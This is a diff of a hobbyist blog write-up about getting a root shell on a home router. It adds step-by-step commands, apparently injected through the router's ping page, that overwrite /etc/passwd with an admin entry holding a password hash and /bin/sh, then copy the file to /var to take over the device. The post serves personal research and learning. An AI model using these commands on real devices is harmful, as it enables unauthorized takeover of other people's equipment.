@@ -42,8 +42,33 @@ There are 3 users in the file, only 2 are available to login. But one (super) is
 
 Anyway, after that I tried some reverse shells commands, like ``nc`` and ``telnet`` to no aval. It seems that the router didn't have those binaries. So, I decided to just change the shell of the __admin__ user, from ``config`` to ``sh``. 
 
-My first throught was to directly overwrite the passwd file, so I tried this command: ``echo -n 'admin:$1$$CoERg7ynjYLsj2j4glJ34.:1:0::/tmp:/bin/sh' > /etc/passwd ``, to no avail. The page returned me like the ping command returned an error.
+My first throught was to directly overwrite the passwd file, so I tried this command: ``echo -n 'admin:$1$$CoERg7ynjYLsj2j4glJ34.:1:0::/tmp:/bin/sh' > /etc/passwd ``, to no avail. The page returned was like something went wrong with the ping command.
 
 ![8]({{ site.url }}/imgs/tech-r5336/8.png)
 
 ![9]({{ site.url }}/imgs/tech-r5336/9.png)
+
+But I relized that if I split command into two echo's, nothing wrong would happen. Very wierd indeed.
+
+So, after that, I split the echo command into two, and they became:
+
+``echo -n 'admin:$1$$CoERg7ynjYLsj2j4glJ34' > /tmp/1``
+``echo -n '.:1:0::/tmp:/bin/sh' > /tmp/2``
+
+If these two, I can prompt a trick to write to ``/etc/passwd`` using ``cat``. This is how I got that:
+
+``cat /tmp/1 /tmp/2 > /tmp/passwd``
+``cp /tmp/passwd /var/passwd``
+
+I copied the file to ``/var/passwd`` because the ``/etc`` directory was a symbolic link to ``/var``. 
+
+After that, I used telnet to login again on my router, and what did I got?
+
+![10]({{ site.url }}/imgs/tech-r5336/10.png)
+
+A nice and confy busybox shell. :)
+
+Unfortunely, the /etc/passwd file isn't persisted, but I wrote a small exploit to do that for us. You can find it [here]().
+
+And that's all, folks. Hope you have fun reading! I surely did have fun hacking it. :^)
+
